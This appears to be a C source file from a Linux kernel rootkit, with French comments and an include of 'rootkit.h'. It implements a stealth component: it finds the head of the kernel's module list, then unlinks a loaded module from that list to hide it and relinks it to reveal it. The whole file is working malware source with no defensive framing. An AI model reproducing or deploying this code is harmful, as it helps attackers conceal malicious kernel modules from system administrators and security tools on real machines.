/* Hide in Modules List */
/*  https://elixir.bootlin.com/linux/v3.8/source/include/linux/module.h#L223 */

#include <linux/kernel.h>
#include <linux/mutex.h>
#include "rootkit.h"

static struct list_head *p_modules = NULL;

/* Obtenir la tête de la liste des modules */
static struct list_head *get_modules_head(struct module *mod)
{
    struct list_head *pos;

    mutex_lock(&module_mutex);

    list_for_each(pos, &mod->list) {
        if ((unsigned long)pos < MODULES_VADDR) {
            mutex_unlock(&module_mutex);
            return pos;
        }
    }

    mutex_unlock(&module_mutex);
    return NULL;
}

/* Masquer ou afficher le module */
void hide(struct module *mod, int hide)
{
    mutex_lock(&module_mutex);

    if (hide) {
        list_del(&mod->list);  // Masquer le module
    } else {
        list_add(&mod->list, p_modules);  // Réinsérer le module
    }

    mutex_unlock(&module_mutex);
}

/* Initialiser le masquage en récupérant la tête de la liste des modules */
int hide_init(struct module *mod)
{
    p_modules = get_modules_head(mod);
    return p_modules ? 0 : -EINVAL;
}